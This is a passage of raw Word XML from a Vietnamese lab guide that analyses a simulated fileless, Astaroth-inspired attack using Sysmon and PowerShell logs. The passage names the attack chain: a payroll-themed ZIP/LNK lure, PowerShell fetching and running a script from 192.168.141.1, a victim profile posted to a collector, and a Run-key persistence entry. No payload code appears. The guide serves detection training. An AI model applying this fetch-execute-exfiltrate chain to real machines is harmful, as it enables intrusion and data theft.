      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Image: powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Destination: 192.168.141.1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Port: 8000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ý nghĩa:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; TCP</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  -&gt; 192.168.141.1:8000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là bằng chứng payload được lấy qua mạng.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Với kịch bản online, cũng nên tìm thêm kết nối đến collector:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Image: powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Destination: 192.168.141.1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Port: 8001</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đây là bằng chứng payload gửi JSON profile về attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>19. Phân tích PowerShell Event ID 4104</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Đi tới:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event Viewer</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Applications and Services Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Microsoft</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        PowerShell</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">          Operational</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Filter:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event ID 4104</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Tại đây có thể quan sát nội dung script được PowerShell xử lý. Điểm quan trọng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">File system không có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>PowerShell log vẫn có thể ghi lại nội dung script được xử lý.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kết luận cần viết:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Fileless không đồng nghĩa với không thể quan sát. Nếu bật logging đúng, defender vẫn có thể thấy dấu vết thực thi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>20. Phân tích Sysmon Event ID 11</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Filter:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Event ID 11</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kiểm tra xem có các file sau được tạo không:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.dll</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload.b64</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>payload-decoded.ps1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Kỳ vọng:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Không có các file payload trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Tất nhiên vẫn có thể thấy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>vì đây là delivery và launcher.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>21. Sáu bằng chứng quan trọng nhất</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bằng chứng 1:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Sysmon Event ID 3:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>powershell.exe -&gt; 192.168.141.1:8000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload đã được lấy qua mạng.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bằng chứng 2:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>PowerShell Event ID 4104:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Invoke-RestMethod</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>ScriptBlock::Create</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Code đã được PowerShell xử lý/thực thi.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bằng chứng 3:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Collector server port 8001:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>POST /collect HTTP/1.1 200</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>victim-profile-*.json</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload đã gửi profile máy không nhạy cảm về attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bằng chứng 4:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Registry:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>HKCU\Software\Microsoft\Windows\CurrentVersion\Run\FilelessLabDemo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload đã mô phỏng persistence.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bằng chứng 5:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Offline staging:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>%TEMP%\FilelessLab\queue\victim-profile-*.json</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Khi mất mạng, profile được lưu tạm trên victim để chờ gửi lại.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Bằng chứng 6:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Sysmon Event ID 11:</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>không có payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>không có payload.exe</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>không có payload.dll</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Payload không được ghi thành file.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Công thức kết luận:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Network delivery</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  + Script execution</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  + Victim profiling</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  + Offline staging</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  + Benign persistence simulation</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  + No payload file</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  = Astaroth-inspired campaign behavior</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>22. Cleanup sau lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên victim, xóa ZIP/LNK đã tải về nếu cần:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FilelessLabDemo" -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-Item -Path "$env:TEMP\FilelessLab" -Recurse -Force -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-Item -Path "$env:USERPROFILE\Downloads\ThongBaoLuong_Q3.zip" -Force -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-Item -Path "$env:USERPROFILE\Downloads\ThongBaoLuong_Q3" -Recurse -Force -ErrorAction SilentlyContinue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên attacker, nếu muốn dọn toàn bộ thư mục lab:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-Item -Path C:\Fileless-Lab -Recurse -Force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>23. Checklist kết quả</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Victim tải được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
        <w:ind w:left="360"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">[ ] Victim giải nén được </w:t>
      </w:r>
      <w:r>
        <w:rPr>
